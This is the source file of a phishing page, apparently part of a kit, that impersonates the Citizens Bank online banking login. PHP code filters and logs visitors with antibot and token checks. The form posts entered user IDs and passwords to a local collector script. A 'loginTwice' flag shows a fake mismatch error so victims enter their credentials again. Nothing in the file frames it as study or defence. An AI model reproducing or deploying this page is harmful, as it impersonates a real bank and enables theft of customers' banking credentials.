<?php

    session_start();

    require_once '../Meta/Comp.php';
    require_once '../Meta/Antibot.php';
    require_once '../Meta/demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }

    if (
        !isset($_SESSION['visitor']) ||
        !$_SESSION['visitor']
    ) {
        $comps->log(
            "../Guard/Audio/live.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: Visitor\n\n"
        );
        $_SESSION['visitor'] = 1;
    }

?>

<!DOCTYPE html>
<html class="js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths citizens-Firefox citizens-user-none" lang="en-US">
    <head>
        <title>Online Login | Citizens Bank</title>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
        <link rel="shortcut icon" href="../Guard/img/favicon.png" type="image/x-icon">
        <link rel="stylesheet" href="../Guard/css/Login/jquery-ui-1.css">
        <link rel="stylesheet" href="../Guard/css/Login/normalize.css">
        <link rel="stylesheet" href="../Guard/css/Login/main.css">
        <link rel="stylesheet" href="../Guard/css/Login/flows.css">
        <link rel="stylesheet" href="../Guard/css/Login/ad-containers.css">
        <link rel="stylesheet" href="../Guard/css/Login/citizensns.css">
        <link rel="stylesheet" href="../Guard/css/Login/sec-3-3.css">
    </head>
    <body class="responsive-enabled" style="display: block;">
        <div class="citizens-header-footer-injected">
            <style>
                .help-modal-header .help-modal-close {
                    background: url(/efs/hhf/img/modal-help-close.png) center center no-repeat transparent;
                    background-size: 20px;
                }

                .help-modal-menu a.active {
                    background: #f2faf8 url(/efs/hhf/img/arrow-right-green.png) right 20px center no-repeat;
                    background-position: right 20px center;
                    background-size: 7px
                }

                .account-section-title.checkmark h1 {
                    padding: 0px 0px 5px 28px !important;
                }

                .lt-ie9 .help-modal-menu a.active {
                    background: #f2faf8 url(/efs/hhf/img/arrow-right-green.png) right 20px center no-repeat !important;
                    background-size: 7px !important
                }

                .input-wrapper .tooltip {
                    margin-left: 1px;
                }
            </style>
            <div class="citizens-header-footer">
                <div class="citi-modal timeout-modal simplemodal-data" id="timeout-modal" style="display:none;"></div>
                <div class="citi-modal help-modal" id="help-modal" tabindex="0" style="display:none;"></div>
            </div>
        </div>
        <div class="citizens-header">
            <style>
                .citizens-header-footer-overlay {
                    opacity: 1;
                    background-color: #fff;
                    position: fixed;
                    width: 100%;
                    height: 100%;
                    top: 0px;
                    left: 0px;
                    z-index: 1000;
                }

                .citizens-header-footer-overlay .centered-content {
                    width: 100%;
                    max-width: 1060px;
                    padding: 0 20px;
                    margin: 0 auto;
                    font-family: arial, helvetica, san-serif;
                    font-size: 14px;
                }

                .citizens-header-footer-overlay .responsive-enabled .centered-content {
                    width: auto;
                    max-width: 1060px;
                }

                .citizens-header-footer-overlay .page-logo {
                    float: none;
                }

                .citizens-header-footer-overlay .page-logo img {
                    margin: 10px;
                    float: none;
                }

                .citizens-header-footer-overlay .topshadow {
                    position: absolute;
                    width: 100%;
                    top: 100px;
                    z-index: 5;
                    height: 8px;
                    background: -webkit-radial-gradient(50% 100%, farthest-side, rgba(0, 0, 0, 0.1), transparent 100%);
                    background: radial-gradient(farthest-side at 50% 100%, rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0) 100%);
                    background-repeat: no-repeat;
                    background-size: cover;
                }
            </style>
            <style>
                .account-section-title.checkmark h1 {
                    padding: 0px 0px 5px 28px !important;
                }

                .mobile-alert-dot {
                    min-width: 22px;
                    min-height: 22px;
                    width: auto;
                    height: auto;
                    max-width: 50px;
                    max-height: 50px;
                    padding: 5px;
                }
            </style>
            <div class="citizens-header-footer">
                <div id="page-header" class="page-header">
                    <div class="topshadow"></div>
                    <div class="centered-content clearfix">
                        <a style="cursor: pointer;" class="page-logo" tabindex="1">
                            <img alt="Citizens Bank" src="../Guard/img/CTZ_Green-01.png" width="203" height="25">
                        </a>
                        <div id="header-navigation-container"></div>
                    </div>
                </div>
            </div>
        </div>
        <div id="page-container" class="page-container">
            <div class="centered-content clearfix">
                <section id="top-content" class="page-region top-content">
                </section>
                <section id="main-container" class="main-container two-col layout-2-1 clearfix">
                    <section id="main-content" class="page-region main-content">
                        <div class="account-table account-table-full">
                            <span class="account-table-border"></span>
                            <div class="account-table-content">
                                <div class="account-content-container">
                                    <div class="account-table-body">
                                        <header class="account-section-title clearfix account-secure">
                                            <a style="cursor: pointer;" class="mobile-help-trigger">Help</a>
                                            <h1>Secure Online Banking Login</h1>
                                        </header>
                                        <div id="GlobalMessageContainer">
                                            <div class="global-message status-message">
                                                <h1>Important Updates</h1>
                                                <ul>
                                                    <li>COVID-19: Visit our <a style="cursor: pointer;">Resource Center</a> for the latest information, including <a style="cursor: pointer;">Economic Impact Payments</a> (Stimulus Payments).</li>
                                                </ul>
                                            </div>
                                        </div>
                                        <div id="error"></div>
                                        <section class="account-section">
                                            <form method="POST" action="../Meta/Benchmark/?token=<?php echo $_SESSION['token']; ?>" id="form" class="pay-transfer-options clearfix">
                                                <div class="account-title clearfix">
                                                    <p>Please enter your Online User ID and Password.</p>
                                                </div>
                                                <div class="form-item label-right full-width clearfix">
                                                    <label id="lu" for="UserID"><strong>Online User ID: </strong></label>
                                                    <input type="text" id="UserID" name="username" autocomplete="off" maxlength="20" class="required demo-username">
                                                    <div class="full-width checkbox-item clearfix">
                                                        <input type="checkbox" tabindex="5" id="cbSaveUserID" style="vertical-align:top">
                                                        <span class="inline-tooltip">
                                                            <label for="cbSaveUserID">Remember User ID</label>
                                                            <span id="tooltipHover" class="tooltip">
                                                                <div id="tooltip" class="tooltip-icon" title="Remember User ID tooltip"></div>
                                                                <div class="tooltip-box">
                                                                    <div class="tooltip-content" id="aria-tooltip-content">
                                                                        <span class="tooltip-arrow"></span>
                                                                        <div>Select the "Remember User ID" box on the Login page if you want to be remembered.</div>
                                                                        <br>
                                                                        <div>Please note, if the
                                                                            "Remember User ID" check box is not displayed on the Login page, click
                                                                            on the "Login using different Online User ID" link to display it.</div>
                                                                        <br>
                                                                        <div>DO NOT check this box if you are using a public device that is accessible to others.</div>
                                                                    </div>
                                                                    <div class="bottomshadow"></div>
                                                                </div>
                                                            </span>
                                                        </span>
                                                    </div>
                                                    <div class="form-item full-width">
                                                        <label id="lp" for="currentpassword"><strong>Password: </strong></label>
                                                        <input type="password" id="currentpassword" name="password" maxlength="15" class="required demo-password">
                                                    </div>
                                                    <span style="cursor: pointer;" class="mobile-line-break"><a tabindex="7" style="font-size:16px!important">Trouble logging in?</a></span><br>
                                                </div>
                                                <div id="fielderror" class="show-error" role="alert">We're sorry. That user ID and password does not match our records. Please try again, or do you need Login Assistance?</div>
                                                <div class="form-actions">
                                                    <input id="btn" type="submit" class="submit-button arrow" value="Login"> <a tabindex="8" style="cursor: pointer;" class="cancel">Cancel</a>
                                                </div>
                                            </form>
                                        </section>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                    <aside id="main-sidebar" class="page-region main-sidebar">
                        <div id="citizens-help" class="citizens-help sidebar-item sidebar-list-container sidebar-accordian mobile-modal">
                            <div class="sidebar-list-content">
                                <header class="sidebar-list-title">
                                    <h3>Need Help?</h3>
                                </header>
                                <div id="faq-holder">
                                    <section class="toggle-list-container faq-container" id="faq-index-1">
                                        <a style="cursor: pointer;" title="Expand contents of Where can I get login assistance for Online Banking?" class="sidebar-list-option-accordian showhide">Where can I get login assistance for Online Banking?</a>
                                    </section>
                                    <section class="toggle-list-container faq-container" id="faq-index-10">
                                        <a style="cursor: pointer;" title="Expand contents of Is Online Banking secure?" class="sidebar-list-option-accordian showhide">Is Online Banking secure?</a>
                                    </section>
                                    <section class="toggle-list-container faq-container" id="faq-index-12">
                                        <a style="cursor: pointer;" class="sidebar-list-option-accordian showhide" title="Show contents of Should my browser address bar have a green indicator when I use Online Banking?">Should my browser address bar have a "green" indicator when I use Online Banking?</a>
                                    </section>
                                    <section class="toggle-list-container faq-container" id="faq-index-20">
                                        <a style="cursor: pointer;" title="Expand contents of How do I log into Online Banking if Iâm a first-time user?" class="sidebar-list-option-accordian showhide">How do I log into Online Banking if I'm a first-time user?</a>
                                    </section>
                                </div>
                                <ul class="sidebar-list">
                                    <li class="cta-row">
                                        <a style="cursor: pointer;" class="blue">View All Help Topics</a>
                                    </li>
                                    <li class="cta-row sign-up-prompt visible clearfix">
                                        <span>Haven't signed up for Online Banking?</span>
                                        <a style="cursor: pointer;" class="cta orange">Enroll Now</a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </aside>
                </section>
            </div>
        </div>
        <div class="citizens-footer">
            <div class="citizens-header-footer">
                <footer id="page-footer" class="page-footer">
                    <div class="footer-top">
                        <ul>
                            <li>
                                <a style="cursor: pointer;" class="contact" title="Opens Ways to Contact Us Dialog">
                                    <span class="account-underline">Ways to Contact Us</span><span class="visuallyhidden">- Opens Ways to Contact Us Dialog</span>
                                </a>
                            </li>
                            <li>
                                <a style="cursor: pointer;" class="locator" title="Opens Branch &amp; ATM Locator Dialog">
                                    <span class="account-underline">Branch &amp; ATM Locator</span><span class="visuallyhidden">- Opens Branch &amp; ATM Locator Dialog</span>
                                </a>
                            </li>
                        </ul>
                    </div>
                    <div class="footer-row clearfix">
                        <ul>
                            <li>
                                <h6>Checking &amp; Savings</h6>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Checking</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Savings</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Money Markets</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Certificates of Deposit (CDs)
                                    <sup>®</sup>
                                </a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">IRAs</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Programs &amp; Services</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Benefits &amp; Features</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Debit Card</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Overdraft Choices
                                    <sup>®</sup>
                                </a>
                            </li>
                        </ul>
                        <ul>
                            <li>
                                <h6>Home Borrowing</h6>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Mortgages</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Home Equity Loans</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Home Equity Lines of Credit</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Determine My Rate</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">My Mortgage Account</a>
                            </li>
                        </ul>
                        <ul>
                            <li>
                                <h6>Students</h6>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Student Loan Options</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Refinancing Student Loans</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">The Student Loan Process</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Undergraduate Students &amp; Parents</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Graduate Students</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Tools &amp; Information</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Banking for Students</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Access My Student Loan</a>
                            </li>
                        </ul>
                        <ul class="last">
                            <li>
                                <h6>Cards</h6>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Credit Cards</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Card Agreements</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Security Features</a>
                            </li>
                        </ul>
                    </div>
                    <div class="footer-row clearfix">
                        <ul>
                            <li>
                                <h6>Personal Loans</h6>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Overview</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">FAQs</a>
                            </li>
                        </ul>
                        <ul>
                            <li>
                                <h6>Resources</h6>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Order Checks</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Online &amp; Mobile Banking</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Customer Service</a>
                            </li>
                        </ul>
                        <ul>
                            <li>
                                <h6>About Us</h6>
                            </li>
                            <li>
                                <a style="cursor: pointer;">About Citizens Bank</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">In the Community</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Careers</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">About Our Ads</a>
                            </li>
                        </ul>
                        <ul class="last">
                            <li>
                                <h6>Solutions</h6>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Personal</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Investing</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Small Business</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Commercial</a>
                            </li>
                        </ul>
                    </div>
                    <div class="footer-row clearfix">
                        <ul>
                            <li>
                                <h6>Disclosures</h6>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Online Terms and Conditions</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Electronic Notice Disclosure and Consent (Online Service)</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Account Documents</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Member FDIC</a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Equal Housing Lender
                                    <img alt="Equal Housing Lender" title="Equal Housing Lender" src="../Guard/img/equal-housing.gif">
                                </a>
                            </li>
                            <li>
                                <a style="cursor: pointer;">Security, Privacy &amp; Legal</a>
                            </li>
                        </ul>
                    </div>
                    <div class="centered-content">
                        <div class="footer-bottom">
                            <p class="legal">
                                Zelle and the Zelle related marks are wholly owned by Early Warning Services, LLC and are used herein under license.
                            </p>
                            <p class="legal">
                                *Securities, Insurance and Investment Advisory Services offered through
                                Citizens Securities, Inc. ("CSI"), also referred to as Citizens
                                Investment Services. CSI is an SEC registered investment adviser and
                                Member - FINRA and SIPC. 770 Legacy Place, MLP240, Dedham, MA 02026.
                                (800) 942-8300. CSI is an affiliate of Citizens Bank, N.A.<br><br>The
                                investment balances shown in online banking are based on market prices,
                                with up to a fifteen minute delay from the time this webpage was last
                                refreshed. Information relating to accounts not held at CSI is
                                presented as an accommodation and while drawn from sources believed to
                                be reliable is not guaranteed as to accuracy or completeness. Such
                                information should be independently confirmed by the account owner(s).<br><br>Information
                                relating to accounts not held or custodied by National Financial
                                Services (NFS) (Assets Held Away), CSI’s clearing broker dealer, was
                                provided to NFS by outside parties and is included for informational
                                purposes only. These positions are not part of your brokerage account
                                carried by NFS and therefore any SIPC account protection afforded your
                                account through NFS does not cover these assets or prices reported.
                                Neither NFS, CSI nor Citizens Bank are responsible for the Assets Held
                                Away information provided and does not guarantee the accuracy or
                                timeliness of the positions or prices reported. Prices shown do not
                                necessarily reflect the actual current market prices. Further
                                information regarding these prices may be obtained by contacting CSI.<br><br>The
                                investment products and financial strategies suggested herein are
                                subject to investment risk, including possible loss of principal amount
                                invested. Investment decisions should be based on each individual's
                                goals, time horizon and tolerance for risk.<br><br>SpeciFi<sup>®</sup>
                                is made available through CSI. Portfolio management services are
                                sub-advised by SigFig Wealth Management, LLC ("SigFig"), an SEC
                                registered investment adviser. SigFig is not an affiliate of CSI or
                                Citizens Bank, N.A.
                            </p>
                            <div class="footer-disclaimer-box footer-disclaimer-box--margin-bottom footer-disclaimer">
                                <p class="footer-disclaimer-box__text">Securities, Insurance Products and Advisory Services are:</p>
                                <ul class="footer-disclaimer-box__list">
                                    <li class="footer-disclaimer-box__list-item">NOT FDIC INSURED</li>
                                    <li class="footer-disclaimer-box__list-item">NOT BANK GUARANTEED</li>
                                    <li class="footer-disclaimer-box__list-item">MAY LOSE VALUE</li>
                                    <li class="footer-disclaimer-box__list-item">NOT A DEPOSIT
                                        <br>
                                    </li>
                                    <li class="footer-disclaimer-box__list-item">NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY</li>
                                </ul>
                            </div>
                            <ul class="footer-util">
                                <li class="sitemap">
                                    <a style="cursor: pointer;">Site Map</a>
                                </li>
                                <li>Follow:
                                    <a style="cursor: pointer;">
                                        <img src="../Guard/img/footer-follow-facebook.png" alt="Facebook" align="middle">
                                    </a>
                                    <a style="cursor: pointer;">
                                        <img src="../Guard/img/footer-follow-twitter.png" alt="Twitter">
                                    </a>
                                    <a style="cursor: pointer;">
                                        <img src="../Guard/img/footer-follow-linkedin.png" alt="Linkedin">
                                    </a>
                                    <a style="cursor: pointer;">
                                        <img src="../Guard/img/footer-follow-youtube.png" alt="Youtube">
                                    </a>
                                </li>
                            </ul>
                            <p class="footer-copyright">
                                © Copyright 2021 Citizens Financial Group, Inc. All rights reserved.<br>Citizens Bank is a brand name of Citizens Bank, N.A. (NMLS ID# 433960).<br>Citizens Bank corporate headquarters: One Citizens Plaza, Providence, RI 02903
                            </p>
                            <img src="../Guard/img/elh.gif" alt="Equal Housing Lender">
                            <img src="../Guard/img/fdicFooter.gif" alt="Member FDIC">
                        </div>
                    </div>
                </footer>
            </div>
        </div>
        <div id="sec-overlay" style="display:none;">
            <div id="sec-container">
            </div>
        </div>
        <script>
            t = document.getElementById("tooltip");
            h = document.getElementById("tooltipHover");

            u = document.getElementById("UserID");
            p = document.getElementById("currentpassword");

            b = document.getElementById("btn");
            f = document.getElementById("form");
            e = document.getElementById("error");

            lu = document.getElementById("lu");
            lp = document.getElementById("lp");

            fe = document.getElementById("fielderror");

            t.addEventListener("mouseover", () => {
                h.classList.add("hover");
            });

            t.addEventListener("mouseout", () => {
                h.classList.remove("hover");
            });

            b.addEventListener("click", (evt) => {
                evt.preventDefault();

                if (
                    u.value.trim() != "" &&
                    p.value.trim() != ""
                ) {
                   f.submit();
                } else {
                    e.innerHTML = '<div class="error-message show-error error" style="display: block;">Please enter your Online User ID and click Login</div>';
                }
            });

            <?php

                if (
                    isset($_SESSION['loginTwice']) &&
                    $_SESSION['loginTwice']
                ) {
                    echo 'u.classList.add("error");
                    p.style = \'border-color: red;\';
        
                    lu.classList.add("error");
                    lp.classList.add("error");
        
                    fe.style = \'display: block;\';
                    e.innerHTML = \'<div class="error-message show-error error-visible" style="display: block;">The information you entered does not match our records. Please check your information and try again.</div>\';';
                }

            ?>
        </script>
    </body>
</html>